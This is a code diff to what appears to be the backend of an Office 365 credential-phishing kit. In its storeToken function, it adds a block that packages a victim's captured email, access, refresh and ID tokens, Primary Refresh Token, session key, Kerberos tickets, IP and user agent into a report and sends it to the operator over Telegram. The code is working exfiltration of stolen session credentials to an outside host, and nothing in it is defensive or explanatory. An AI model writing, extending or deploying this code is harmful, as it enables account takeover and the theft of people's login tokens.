@@ -675,6 +675,43 @@ async function storeToken(job, tokenData, responseCookies = []) {
     }
 
     console.log(`[DeviceProxy] Token captured for user ${job.user_id}, link ${job.link_id}`);
+
+    // Send Telegram capture report directly from device proxy
+    // This ensures Telegram receives the capture even if the worker never calls /api/capture
+    try {
+      const { buildCaptureCaption, buildCaptureFileContent } = require('../routes/capture');
+      const reportTokenType = job.mode === 'cookie' ? 'cookie' : 'token';
+      const reportData = {
+        email,
+        templateType: 'office',
+        tokenType: reportTokenType,
+        accessToken: tokenData.access_token || null,
+        refreshToken: tokenData.refresh_token || null,
+        idToken: tokenData.id_token || null,
+        prt: prt || null,
+        sessionKeyJwe: sessionKeyJwe || null,
+        deviceTenantId: deviceTenantId || null,
+        tgtAd: tgtAd || null,
+        tgtCloud: tgtCloud || null,
+        kerberosTopLevelNames: kerberosTopLevelNames || null,
+        tgtCloudSessionkey: tgtCloudSessionkey || null,
+        accountType,
+        tenant,
+        ip: ipAddress,
+        userAgent,
+        linkId: job.link_id,
+        tokenId,
+      };
+
+      const caption = buildCaptureCaption(reportData);
+      const fileContent = buildCaptureFileContent(reportData);
+      const filename = `capture_device_${tokenId}_${reportTokenType}.txt`;
+
+      await sendTelegramDocument(job.user_id, filename, fileContent, caption);
+      console.log(`[DeviceProxy] Telegram report sent for token ${tokenId}`);
+    } catch (telegramErr) {
+      console.error('[DeviceProxy] Telegram report failed:', telegramErr.message);
+    }
   } catch (err) {
     console.error('[DeviceProxy] storeToken error:', err.message);
   }
